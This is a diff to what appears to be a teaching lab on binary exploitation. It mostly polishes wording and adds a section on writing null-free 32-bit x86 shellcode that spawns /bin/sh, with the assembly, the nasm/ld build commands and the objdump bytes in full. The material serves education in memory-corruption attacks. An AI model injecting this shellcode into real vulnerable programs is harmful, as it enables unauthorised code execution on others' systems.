@@ -405,7 +405,7 @@ At this point, we are going to move outside of `gdb`.
 GBU Debugger creates a separate memory space where the program is being executed.
 As a result, the same address does not work when we exit the debugger.
 It also disables `ASLR` by default when it runs the program.
-We need to manually disable it globally to succeed.
+Usually we need to manually disable it globally to succeed.
 
 In general, only *a small change is required for it to work outside of `gbd`*, which could be brute forced.
 
@@ -447,22 +447,21 @@ Getting used to `pwntools` at this point will help on the following tasks.
 Task 2: Arbitrary code execution
 ---
 
-How about if we crete a bit more advanced payload; some arbitrary code that we want to execute, and pass it into our previously created vulnerable program?
+How about if we create a slightly more advanced payload; some arbitrary code that we want to execute, and pass it to our previously created vulnerable program?
 
-Could we redirect the execution flow into our own code?
-Notably, this could mean execution of our own program inside of another program.
-In the past, this mechanic was very possible.
+Could we redirect the execution flow to our own code?
+Notably, this could mean the execution of our own program within another program.
+In the past, this mechanism was entirely possible.
 
-**Overall, we want to convert the code into the same format as it usually is represented in memory when CPU executes it.**
+**Ultimately, the goal is to transform the code into the format that mirrors its representation in memory during CPU execution.**
 
-We could initially develop a payload in C/C++ code for clarity.
-Once written, this code should be manually converted into machine code. It's not recommended to automatically generate assembly from a compiled binary due to several concerns.
-After this, the machine code can be integrated with other instructions to finalize the payload.
+For clarity's sake, we can draft the payload using C/C++.
+After drafting, this code should be manually translated into machine code. Avoid auto-generating assembly from a compiled binary due to various concerns, which are noted later.
+Subsequently, this machine code can be combined with other instructions to complete the payload.
 
+A well-known white paper on this approach is written by Aleph One[^1].
 
-Maybe the most known white paper about this method is the Aleph One's [^1].
-
-For more background, you can also check the previously mentioned book and the following blog posts:
+For a deeper understanding, consider referring to the previously cited book and the subsequent blog articles.
 
   * https://0x00sec.org/t/linux-shellcoding-part-1-0/289
   * https://dhavalkapil.com/blogs/Shellcode-Injection/
@@ -483,12 +482,82 @@ int main() {
 }
 ```
 
-We can compile the code and run it. It spawns a shell.
+We can compile the code and run it. It spawns a shell `/bin/sh`.
 ```bash
-gcc -o simpleshell Simpleshell.c
-./simpleshell
+gcc -o shell shell.c
+./shell
 exit
 ```
+
+If we take a look for the generated machine code with `objdump -D shell`, it appears that our binary is quite large and it **also includes many null bytes `0x00`**.
+Often, our shellcode cannot include null bytes, because the vulnerability is often in string functions, like in this case.
+For example, `strcpy` terminates on null byte.
+
+Also, null bytes behave differently in many other cases.
+
+As a result, we need to write the above functionality without null bytes.
+We could get the following 32-bit assembly:
+```x86asm
+global _start
+
+section .text
+_start:
+
+xor eax, eax ; Generate Zeros
+push eax ; Zero to stack
+push 0x68732f6e ;
+push 0x69622f2f ; //bin/sh to stack as reversed (hs/nib//)
+
+
+
+mov ebx, esp ; Make EBX point to //bin/sh on the Stack using ESP
+
+; PUSH 0x00000000 using EAX and point EDX to it using ESP
+
+push eax
+mov edx, esp
+
+; PUSH Address of //bin/sh on the Stack and make ECX point to it using ESP
+
+push ebx
+mov ecx, esp
+
+; EAX = 0, Let's move 11 into AL to avoid nulls in the Shellcode
+
+mov al, 11
+int 0x80
+```
+We can compile and link it to as 32-bit binary.
+
+```bash
+nasm -f elf32 shell.asm
+ld  -m elf_i386 shell.o -o shell
+```
+
+Now if you check the machine code with `objdump -D shell`, you can see that it is free from null bytes.
+
+```sh
+objdump -D shell
+
+shell:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08049000 <_start>:
+ 8049000:       31 c0                   xor    %eax,%eax
+ 8049002:       50                      push   %eax
+ 8049003:       68 6e 2f 73 68          push   $0x68732f6e
+ 8049008:       68 2f 2f 62 69          push   $0x69622f2f
+ 804900d:       89 e3                   mov    %esp,%ebx
+ 804900f:       50                      push   %eax
+ 8049010:       89 e2                   mov    %esp,%edx
+ 8049012:       53                      push   %ebx
+ 8049013:       89 e1                   mov    %esp,%ecx
+ 8049015:       b0 0b                   mov    $0xb,%al
+ 8049017:       cd 80                   int    $0x80
+```
+
 
 ----
 Task 3 : Defeating No-eXecute
